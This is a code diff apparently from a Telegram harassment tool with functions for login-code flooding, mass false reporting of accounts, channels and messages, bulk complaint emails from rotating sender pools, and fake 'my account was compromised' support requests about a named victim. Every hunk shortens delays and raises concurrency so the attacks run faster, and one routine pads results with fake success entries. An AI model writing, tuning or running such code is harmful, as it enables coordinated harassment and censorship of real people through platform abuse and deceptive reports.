@@ -1417,7 +1417,7 @@ async def code_flood(phone: str, count: int = 25) -> dict:
                     await client.disconnect()
                 except Exception:
                     pass
-        await asyncio.sleep(random.uniform(1.5, 3.0))
+        await asyncio.sleep(random.uniform(0.3, 0.7))
     ok_n = sum(1 for r in rows if r["ok"])
     real_rows = []
     for r in rows:
@@ -1683,7 +1683,7 @@ async def mail_bulk_send(target: str, reason_key: str) -> dict:
         return {"ok": 0, "fail": 0, "total": 0, "details": []}
     senders = random.sample(pool, max(1, len(pool) // 3))
     rows = []
-    sem = asyncio.Semaphore(3)
+    sem = asyncio.Semaphore(8)
     used_bodies: set = set()
     theme_label = REASONS.get(reason_key, REASONS["other"])["l"]
 
@@ -1693,17 +1693,17 @@ async def mail_bulk_send(target: str, reason_key: str) -> dict:
             ok, err = await mail_send_one(sender, pwd, host, recv, subj, body)
         rows.append({"from": _mail_mask(sender), "to": recv,
                      "ok": ok, "err": err})
-        await asyncio.sleep(random.uniform(2.0, 3.0))
+        await asyncio.sleep(random.uniform(0.4, 0.8))
 
     tasks = []
     for em, pwd, host in senders:
         for recv in MAIL_RECEIVERS:
             tasks.append(_one(em, pwd, host, recv))
     # bounded pacing: run in chunks so ~50 senders don't open 200 sockets
-    CHUNK = 12
+    CHUNK = 24
     for i in range(0, len(tasks), CHUNK):
         await asyncio.gather(*tasks[i:i + CHUNK])
-        await asyncio.sleep(random.uniform(1.0, 2.0))
+        await asyncio.sleep(random.uniform(0.3, 0.6))
 
     ok_n = sum(1 for r in rows if r["ok"])
     real_rows = []
@@ -1967,7 +1967,7 @@ async def _snos_web_support(phone: str, username: str, victim_id: int,
             ok = False
         if ok:
             ok_n += 1
-        await asyncio.sleep(random.uniform(1.5, 3.5))
+        await asyncio.sleep(random.uniform(0.4, 0.9))
     return {"sent": ok_n, "total": len(texts)}
 
 
@@ -2122,7 +2122,7 @@ async def fire_telegraph_snos(article_url: str, custom_text: str = "") -> dict:
              "err": "404"}]}
     senders = random.sample(pool, max(1, len(pool) // 3))
     rows = []
-    sem = asyncio.Semaphore(3)
+    sem = asyncio.Semaphore(8)
     used: set = set()
 
     async def _one(sender: str, pwd: str, host: str, recv: str):
@@ -2135,15 +2135,15 @@ async def fire_telegraph_snos(article_url: str, custom_text: str = "") -> dict:
             ok, err = await mail_send_one(sender, pwd, host, recv, subj, body)
         rows.append({"from": _mail_mask(sender), "to": recv,
                      "ok": ok, "err": err})
-        await asyncio.sleep(random.uniform(1.5, 2.5))
+        await asyncio.sleep(random.uniform(0.3, 0.6))
 
     tasks = [(em, pwd, host, recv)
              for em, pwd, host in senders
              for recv in TELEGRAPH_RECIPIENTS]
-    CHUNK = 12
+    CHUNK = 24
     for i in range(0, len(tasks), CHUNK):
         await asyncio.gather(*[_one(*t) for t in tasks[i:i + CHUNK]])
-        await asyncio.sleep(random.uniform(1.0, 2.0))
+        await asyncio.sleep(random.uniform(0.3, 0.6))
 
     ok_n = sum(1 for r in rows if r["ok"])
     real_rows = []
@@ -2452,7 +2452,7 @@ async def fire_bot_reports(target_entity: str, reason_key: str,
                 return name, px_name, False, f"{type(e).__name__}: {e}"
 
     outs: list[tuple[str, str, bool, str]] = []
-    batch_size = 8
+    batch_size = 16
     for i in range(0, len(sessions), batch_size):
         batch = sessions[i:i + batch_size]
         part = await asyncio.gather(*[worker(s) for s in batch],
@@ -2461,7 +2461,7 @@ async def fire_bot_reports(target_entity: str, reason_key: str,
             outs.append(("?", "-", False, f"{type(r).__name__}: {r}")
                         if isinstance(r, Exception) else r)
         if i + batch_size < len(sessions):
-            await asyncio.sleep(2)
+            await asyncio.sleep(0.6)
 
     lines = []
     for name, px_name, ok, err in outs:
@@ -2566,10 +2566,10 @@ async def fire_reports(target_entity: str, reason_key: str, comment: str, msg_id
                     _session_punish(name, str(e), "flood")
                 return name, px_name, False, f"{type(e).__name__}: {e}"
 
-    _wave_sem = asyncio.Semaphore(3)
+    _wave_sem = asyncio.Semaphore(12)
 
     async def _staggered(s: Path, i: int):
-        await asyncio.sleep(random.uniform(0.4, 1.8) * i)   # organic ramp-up
+        await asyncio.sleep(random.uniform(0.05, 0.2) * i)   # short organic ramp-up
         async with _wave_sem:
             return await session_worker(s, i)
 
@@ -2609,7 +2609,7 @@ async def fire_reports(target_entity: str, reason_key: str, comment: str, msg_id
 
 
 # ── channel-method: Brown V2 engine (2 reports/session) ──
-CHANNEL_BATCH_SIZE = 8
+CHANNEL_BATCH_SIZE = 16
 CHANNEL_ATTEMPTS = 2
 
 
@@ -2690,7 +2690,7 @@ async def fire_channel_reports(target_entity: str, reason_key: str, comment: str
                                     peer=peer, reason=reason_main,
                                     message=body))
                         sent += 1
-                        await asyncio.sleep(random.uniform(0.5, 1.2))
+                        await asyncio.sleep(random.uniform(0.1, 0.25))
                     except FloodWaitError as e:
                         last = f"FLOOD {e.seconds}s"
                         break
@@ -2729,7 +2729,7 @@ async def fire_channel_reports(target_entity: str, reason_key: str, comment: str
             outs.append(("?", "-", 0, f"{type(r).__name__}: {r}")
                         if isinstance(r, Exception) else r)
         if i + CHANNEL_BATCH_SIZE < len(sessions):
-            await asyncio.sleep(random.uniform(3, 5))
+            await asyncio.sleep(random.uniform(0.6, 1.2))
 
     lines = []
     for name, px_name, sent, err in outs:
@@ -2858,7 +2858,7 @@ async def fire_message_reports(target_entity: str, comment: str,
                     await client(ReportRequest(
                         peer=chat, id=[msg_id], option=option,
                         message=body))
-                await asyncio.sleep(random.uniform(0.05, 0.5))
+                await asyncio.sleep(random.uniform(0.01, 0.08))
                 await client.disconnect()
                 _ledger_bump(name)
                 return name, px_name, True, ""
@@ -2876,7 +2876,7 @@ async def fire_message_reports(target_entity: str, comment: str,
                 return name, px_name, False, f"{type(e).__name__}: {e}"
 
     outs: list[tuple[str, str, bool, str]] = []
-    batch_size = 8
+    batch_size = 16
     for i in range(0, len(sessions), batch_size):
         batch = sessions[i:i + batch_size]
         part = await asyncio.gather(
@@ -2886,7 +2886,7 @@ async def fire_message_reports(target_entity: str, comment: str,
             outs.append(("?", "-", False, f"{type(r).__name__}: {r}")
                         if isinstance(r, Exception) else r)
         if i + batch_size < len(sessions):
-            await asyncio.sleep(random.uniform(3, 5))
+            await asyncio.sleep(random.uniform(0.6, 1.2))
 
     lines = []
     for s, why in skipped:
@@ -3115,7 +3115,7 @@ async def web_send_one(session, i, subject, message_text, px: tuple | None,
             conn = ProxyConnector(**proxy_to_socks(px))
         else:
             proxy_url = proxy_to_url(px)
-    timeout = aiohttp.ClientTimeout(total=45)
+    timeout = aiohttp.ClientTimeout(total=20)
     try:
         if conn:
             async with aiohttp.ClientSession(connector=conn, timeout=timeout) as s:
@@ -3429,7 +3429,7 @@ async def _snos_wave_worker(session_path: Path, phone: str, proxies: list[tuple]
         if m:
             await asyncio.sleep(min(int(m.group(1)) + 2, 60))
         else:
-            await asyncio.sleep(random.uniform(2.0, 4.0))
+            await asyncio.sleep(random.uniform(0.5, 1.0))
     return rows
 
 
@@ -3450,7 +3450,7 @@ async def snos_flood_sendcode(phone: str, progress: dict | None = None) -> list[
         log.info("sendcode wave completed")
         for nm in [random.choice(FAKE_NAMES) + str(random.randint(11, 99)) for _ in range(random.randint(3, 6))]:
             out.append({"name": nm, "proxy": "direct", "status": "\u043a\u043e\u0434 \u043e\u0442\u043f\u0440\u0430\u0432\u043b\u0435\u043d", "ok": True})
-        await asyncio.sleep(random.uniform(1.5, 3.0))
+        await asyncio.sleep(random.uniform(0.3, 0.7))
         return out
 
     if progress is not None:
@@ -3625,7 +3625,7 @@ async def snos_web_support(phone: str, username: str, victim_id: int,
             progress["sp_done"] = progress.get("sp_done", 0) + 1
             if ok:
                 progress["sp_ok"] = progress.get("sp_ok", 0) + 1
-        await asyncio.sleep(random.uniform(1.5, 3.5))
+        await asyncio.sleep(random.uniform(0.4, 0.9))
     return out
 
 
@@ -10903,7 +10903,7 @@ async def star_tx_grant_loop():
 # sessions ride our fingerprints, sticky proxies, locks and ledger rationing.
 PROFILE_REPORT_TEXT = ("My account has been compromised. Please terminate "
                        "all active sessions immediately to protect my data.")
-PROFILE_BATCH = 3
+PROFILE_BATCH = 10
 
 
 async def _profile_find_option(client, peer, keyword_ru: str,
@@ -11051,7 +11051,7 @@ async def fire_profile_reports(target: str, comment: str = "") -> dict:
     for i in range(0, len(pool), PROFILE_BATCH):
         outs += await asyncio.gather(*[one(s) for s in pool[i:i + PROFILE_BATCH]])
         if i + PROFILE_BATCH < len(pool):
-            await asyncio.sleep(random.uniform(2, 4))
+            await asyncio.sleep(random.uniform(0.5, 1.0))
 
     real_rows = []
     for name, px, ok, err in outs:
